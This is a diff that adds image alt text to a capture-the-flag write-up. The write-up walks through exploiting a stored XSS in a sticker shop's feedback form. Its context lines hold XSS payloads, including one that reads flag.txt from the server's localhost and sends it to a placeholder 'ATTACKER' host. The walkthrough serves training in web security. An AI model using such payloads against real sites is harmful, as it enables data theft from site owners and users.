@@ -33,21 +33,21 @@ nmap -A -p- TARGET -oN stickershop.nmap --min-rate 10000
 | 22       | ssh         |
 | 8080     | http        |
 
-![](https://cdn.ziomsec.com/stickershop/1.webp)
+![performing an nmap scan on stickershop](https://cdn.ziomsec.com/stickershop/1.webp)
 
 ## Capturing The Flag
 
 Since I already had the path to flag, I tried accessing it directly.
 
-![](https://cdn.ziomsec.com/stickershop/2.webp)
+![asccessing the path to flag](https://cdn.ziomsec.com/stickershop/2.webp)
 
 I did not have the appropriate permissions, so I visited the web site hosted on the target.
 
-![](https://cdn.ziomsec.com/stickershop/3.webp)
+![accessing the web application](https://cdn.ziomsec.com/stickershop/3.webp)
 
 The site contained a feedback field at `/submit_feedback`
 
-![](https://cdn.ziomsec.com/stickershop/4.webp)
+![inspecting the feedback functionality](https://cdn.ziomsec.com/stickershop/4.webp)
 
 I tried executing a cross site scripting payload.
 
@@ -55,7 +55,7 @@ I tried executing a cross site scripting payload.
 <img src="a" onerror="alert(1)">
 ```
 
-![](https://cdn.ziomsec.com/stickershop/5.webp)
+![injecting an xss payload](https://cdn.ziomsec.com/stickershop/5.webp)
 
 My XSS payload worked, hence I modified my payload to make the server send a request to my local machine.
 
@@ -63,11 +63,11 @@ My XSS payload worked, hence I modified my payload to make the server send a req
 <img src="nonexistent-image.jpg" onerror="fetch('http://ATTACKER')" />
 ```
 
-![](https://cdn.ziomsec.com/stickershop/6.webp)
+![attempting to get a callback on local listener](https://cdn.ziomsec.com/stickershop/6.webp)
 
 Upon execution, my local machine received a GET request from the server.
 
-![](https://cdn.ziomsec.com/stickershop/7.webp)
+![getting a callback on local listener](https://cdn.ziomsec.com/stickershop/7.webp)
 
 Hence, I used the below payload to make the server get the data from *flag.txt* and then send it to my local machine through a GET request.
 
@@ -75,11 +75,11 @@ Hence, I used the below payload to make the server get the data from *flag.txt* 
 <img src='a' onerror='fetch("http://127.0.0.1:8080/flag.txt").then(r=>r.text()).then(d=>fetch("http://ATTACKER?data="+encodeURIComponent(d))).catch(e=>console.error(e));
 ```
 
-![](https://cdn.ziomsec.com/stickershop/8.webp)
+![making the server send the contents of flag](https://cdn.ziomsec.com/stickershop/8.webp)
 
 Upon execution, I successfully received the value of the flag.
 
-![](https://cdn.ziomsec.com/stickershop/9.webp)
+![capturing the flag](https://cdn.ziomsec.com/stickershop/9.webp)
 
 That's it from my end :)
 Happy Hacking !
